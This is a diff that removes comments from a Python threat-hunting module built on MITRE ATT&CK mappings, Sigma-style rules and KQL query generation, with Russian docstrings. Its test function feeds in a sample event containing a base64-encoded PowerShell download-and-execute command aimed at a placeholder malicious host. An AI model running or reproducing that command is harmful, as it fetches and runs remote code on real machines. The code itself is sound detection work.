@@ -1,5 +1,4 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 
 """
 SHARD Threat Hunting AI Module
@@ -29,9 +28,6 @@ import numpy as np
 import yaml
 
 
-# ============================================================
-# КОНФИГУРАЦИЯ
-# ============================================================
 
 class HuntingSeverity(Enum):
     """Серьёзность находки охоты"""
@@ -55,26 +51,20 @@ class HuntingStatus(Enum):
 class ThreatHuntingConfig:
     """Конфигурация Threat Hunting AI"""
 
-    # Источники данных
     sigma_rules_path: str = "./data/threat_hunting/sigma_rules/"
     custom_rules_path: str = "./data/threat_hunting/custom_rules/"
     hypotheses_path: str = "./data/threat_hunting/hypotheses/"
 
-    # База данных
     db_path: str = "./data/threat_hunting/hunting.db"
 
-    # Интервалы
     hunting_interval_minutes: int = 30
-    hypothesis_generation_interval: int = 3600  # 1 час
+    hypothesis_generation_interval: int = 3600
 
-    # Пороги
     anomaly_threshold: float = 0.7
     confidence_threshold: float = 0.6
 
-    # MITRE ATT&CK
     mitre_enterprise_path: str = "./data/mitre/enterprise-attack.json"
 
-    # Автоматизация
     auto_generate_hypotheses: bool = True
     auto_investigate: bool = True
     max_concurrent_investigations: int = 5
@@ -118,9 +108,6 @@ class HuntingFinding:
     remediation: Optional[str] = None
 
 
-# ============================================================
-# MITRE ATT&CK KNOWLEDGE BASE
-# ============================================================
 
 class MITREAttackKnowledge:
     """База знаний MITRE ATT&CK"""
@@ -219,7 +206,6 @@ class MITREAttackKnowledge:
             'TA0040': {'name': 'Impact', 'short_name': 'impact'}
         }
 
-        # Ключевые техники
         self.techniques = {
             'T1059': {'name': 'Command and Scripting Interpreter', 'tactics': ['execution']},
             'T1059.001': {'name': 'PowerShell', 'tactics': ['execution']},
@@ -263,9 +249,6 @@ class MITREAttackKnowledge:
         return techniques
 
 
-# ============================================================
-# SIGMA RULES ENGINE
-# ============================================================
 
 class SigmaRulesEngine:
     """Движок Sigma-правил для обнаружения угроз"""
@@ -291,7 +274,6 @@ class SigmaRulesEngine:
                             rule_id = rule['id']
                             self.rules[rule_id] = rule
 
-                            # Индексация
                             for tag in rule.get('tags', []):
                                 if tag.startswith('attack.t'):
                                     self.rules_by_tactic[tag].append(rule_id)
@@ -304,7 +286,6 @@ class SigmaRulesEngine:
                 except Exception as e:
                     print(f"Error loading Sigma rule {rule_file}: {e}")
 
-        # Если правил нет - создаём встроенные
         if not self.rules:
             self._create_embedded_rules()
 
@@ -425,7 +406,6 @@ class SigmaRulesEngine:
         match_count = 0
         total_conditions = 0
 
-        # Проверка ключевых слов
         keywords = detection.get('keywords', [])
         if keywords:
             total_conditions += 1
@@ -435,7 +415,6 @@ class SigmaRulesEngine:
                     match_count += 1
                     break
 
-        # Проверка портов
         ports = detection.get('ports', [])
         if ports:
             total_conditions += 1
@@ -443,7 +422,6 @@ class SigmaRulesEngine:
             if event_port in ports:
                 match_count += 1
 
-        # Проверка команд
         commands = detection.get('commands', [])
         if commands:
             total_conditions += 1
@@ -453,7 +431,6 @@ class SigmaRulesEngine:
                     match_count += 1
                     break
 
-        # Проверка порога
         threshold = detection.get('threshold', {})
         if threshold:
             total_conditions += 1
@@ -461,7 +438,6 @@ class SigmaRulesEngine:
             if count >= threshold.get('count', 0):
                 match_count += 1
 
-        # Проверка паттернов
         patterns = detection.get('patterns', [])
         if patterns:
             total_conditions += 1
@@ -487,9 +463,6 @@ class SigmaRulesEngine:
         return [self.rules[rid] for rid in rule_ids if rid in self.rules]
 
 
-# ============================================================
-# HYPOTHESIS GENERATOR
-# ============================================================
 
 class HypothesisGenerator:
     """Генератор гипотез для охоты на угрозы"""
@@ -572,7 +545,6 @@ class HypothesisGenerator:
                 confidence=0.7
             )
 
-            # Добавляем Sigma-правила
             for tech in h['mitre_techniques']:
                 rules = self.sigma_engine.get_rules_for_technique(f"attack.{tech}")
                 for rule in rules:
@@ -585,13 +557,11 @@ class HypothesisGenerator:
         """Генерация гипотез на основе находок"""
         new_hypotheses = []
 
-        # Группировка по техникам
         techniques_found = defaultdict(int)
         for f in findings:
             for tech in f.get('mitre_techniques', []):
                 techniques_found[tech] += 1
 
-        # Создание гипотез для частых техник
         for tech, count in techniques_found.items():
             if count >= 3:
                 tech_name = self.mitre_kb.get_technique_name(tech)
@@ -618,7 +588,6 @@ class HypothesisGenerator:
         """Генерация KQL запроса для гипотезы"""
         query_parts = []
 
-        # Базовые таблицы
         if 'credential-access' in hypothesis.mitre_tactics:
             query_parts.append("SecurityEvent | where EventID in (4624, 4625, 4672)")
 
@@ -641,9 +610,6 @@ class HypothesisGenerator:
             query_parts) + " | project TimeGenerated, EventID, ProcessName, CommandLine, SourceIP, DestinationIP"
 
 
-# ============================================================
-# THREAT HUNTING ENGINE
-# ============================================================
 
 class ThreatHuntingEngine:
     """
@@ -655,17 +621,14 @@ class ThreatHuntingEngine:
         self.config = config or ThreatHuntingConfig()
         self.logger = logger
 
-        # Компоненты
         self.mitre_kb = MITREAttackKnowledge(self.config)
         self.sigma_engine = SigmaRulesEngine(self.config)
         self.hypothesis_generator = HypothesisGenerator(self.mitre_kb, self.sigma_engine)
 
-        # Хранилище
         self.hypotheses: Dict[str, HuntingHypothesis] = {}
         self.findings: List[HuntingFinding] = []
         self.evidence_buffer: deque = deque(maxlen=10000)
 
-        # Статистика
         self.stats = {
             'total_hypotheses': 0,
             'total_investigations': 0,
@@ -678,7 +641,6 @@ class ThreatHuntingEngine:
         self._running = False
         self._hunting_thread = None
 
-        # Загрузка существующих гипотез
         self._load_hypotheses()
 
     def _load_hypotheses(self):
@@ -708,10 +670,8 @@ class ThreatHuntingEngine:
     def _hunting_loop(self):
         """Основной цикл охоты"""
         while self._running:
-            # Запуск активных гипотез
             self.run_active_hypotheses()
 
-            # Генерация новых гипотез (раз в час)
             if self.config.auto_generate_hypotheses and self.stats['total_investigations'] % 10 == 0:
                 self.generate_new_hypotheses()
 
@@ -754,16 +714,12 @@ class ThreatHuntingEngine:
         """Расследование гипотезы"""
         findings = []
 
-        # Обновление статуса
         hypothesis.status = HuntingStatus.INVESTIGATING
         hypothesis.last_run = time.time()
 
-        # Проверка Sigma-правил
         for rule_id in hypothesis.sigma_rules:
             rule = self.sigma_engine.rules.get(rule_id)
             if rule:
-                # Здесь должен быть запрос к SIEM данным
-                # Пока используем симулированные данные
                 if self._simulate_rule_match(rule):
                     finding = HuntingFinding(
                         id=f"F-{hash(rule_id + hypothesis.id) % 100000:05d}",
@@ -780,10 +736,8 @@ class ThreatHuntingEngine:
                     )
                     findings.append(finding)
 
-        # Обновление статистики гипотезы
         hypothesis.findings_count += len(findings)
 
-        # Обновление статуса
         if findings:
             hypothesis.status = HuntingStatus.CONFIRMED
         else:
@@ -794,7 +748,6 @@ class ThreatHuntingEngine:
 
     def _simulate_rule_match(self, rule: Dict) -> bool:
         """Симуляция совпадения правила (для демо)"""
-        # В реальной системе здесь запрос к данным
         severity = rule.get('level', 'medium')
         probabilities = {'critical': 0.3, 'high': 0.2, 'medium': 0.15, 'low': 0.1}
         return np.random.random() < probabilities.get(severity, 0.1)
@@ -811,7 +764,6 @@ class ThreatHuntingEngine:
 
     def _get_affected_assets(self, rule: Dict) -> List[str]:
         """Получение затронутых активов"""
-        # В реальной системе - из логов
         return [f"asset-{i}" for i in range(np.random.randint(1, 4))]
 
     def _get_remediation(self, hypothesis: HuntingHypothesis) -> str:
@@ -833,7 +785,6 @@ class ThreatHuntingEngine:
 
     def generate_new_hypotheses(self):
         """Генерация новых гипотез на основе находок"""
-        # Конвертация находок для генератора
         findings_data = [
             {
                 'mitre_techniques': f.mitre_techniques,
@@ -846,7 +797,6 @@ class ThreatHuntingEngine:
 
         for h in new_hypotheses:
             if h.id not in self.hypotheses:
-                # Генерация KQL запроса
                 h.kql_query = self.hypothesis_generator.generate_kql_query(h)
                 self.hypotheses[h.id] = h
                 self.stats['total_hypotheses'] += 1
@@ -861,7 +811,6 @@ class ThreatHuntingEngine:
             'event': event
         })
 
-        # Оценка на Sigma-правила
         matches = self.sigma_engine.evaluate_event(event)
 
         for rule_id, confidence in matches:
@@ -1008,7 +957,6 @@ class ThreatHuntingEngine:
                     f.status = HuntingStatus.FALSE_POSITIVE
                     self.stats['false_positives'] += 1
 
-                    # Обновление гипотезы
                     if f.hypothesis_id in self.hypotheses:
                         self.hypotheses[f.hypothesis_id].false_positives_count += 1
 
@@ -1025,9 +973,6 @@ class ThreatHuntingEngine:
         return False
 
 
-# ============================================================
-# ИНТЕГРАЦИЯ С SHARD
-# ============================================================
 
 class ShardThreatHuntingIntegration:
     """Интеграция Threat Hunting AI в SHARD"""
@@ -1065,13 +1010,11 @@ class ShardThreatHuntingIntegration:
     def on_alert(self, alert: Dict):
         """Обработка алерта для охоты"""
         if self.engine:
-            # Добавляем алерт как evidence
             self.engine.add_evidence(alert)
 
-            # Проверяем на критические находки
             findings = self.engine.get_findings(min_severity=HuntingSeverity.HIGH, limit=5)
             for f in findings:
-                if f.timestamp > time.time() - 60:  # Только свежие
+                if f.timestamp > time.time() - 60:
                     self._publish_hunting_alert(f)
 
     def on_hypothesis_request(self, data: Dict):
@@ -1097,10 +1040,8 @@ class ShardThreatHuntingIntegration:
     def on_scan_request(self, data: Dict):
         """Обработка запроса сканирования"""
         if self.engine:
-            # Генерация новых гипотез
             self.engine.generate_new_hypotheses()
 
-            # Запуск активных гипотез
             self.engine.run_active_hypotheses()
 
             report = self.engine.generate_report()
@@ -1149,9 +1090,6 @@ class ShardThreatHuntingIntegration:
         return {}
 
 
-# ============================================================
-# ТЕСТИРОВАНИЕ
-# ============================================================
 
 def test_threat_hunting():
     """Тестирование Threat Hunting AI"""
@@ -1162,22 +1100,18 @@ def test_threat_hunting():
     config = ThreatHuntingConfig()
     engine = ThreatHuntingEngine(config)
 
-    # Тест 1: Гипотезы
     print(f"\n📝 Тест 1: Загружено гипотез: {len(engine.hypotheses)}")
     for h in list(engine.hypotheses.values())[:3]:
         print(f"   - {h.name} ({h.severity.value})")
 
-    # Тест 2: MITRE покрытие
     print("\n📝 Тест 2: MITRE ATT&CK покрытие")
     coverage = engine.get_mitre_coverage()
     print(f"   Тактик: {coverage['tactics_covered']}/{coverage['total_tactics']}")
     print(f"   Техник: {coverage['techniques_covered']}/{coverage['total_techniques']}")
     print(f"   Покрытие: {coverage['coverage_percent']}%")
 
-    # Тест 3: Sigma правила
     print(f"\n📝 Тест 3: Sigma правил: {len(engine.sigma_engine.rules)}")
 
-    # Тест 4: Добавление evidence
     print("\n📝 Тест 4: Обработка события")
     test_event = {
         'command_line': 'powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==',
@@ -1187,7 +1121,6 @@ def test_threat_hunting():
     engine.add_evidence(test_event)
     print("   Событие обработано")
 
-    # Тест 5: Статистика
     print("\n📝 Тест 5: Статистика")
     stats = engine.get_stats()
     for key, value in stats.items():
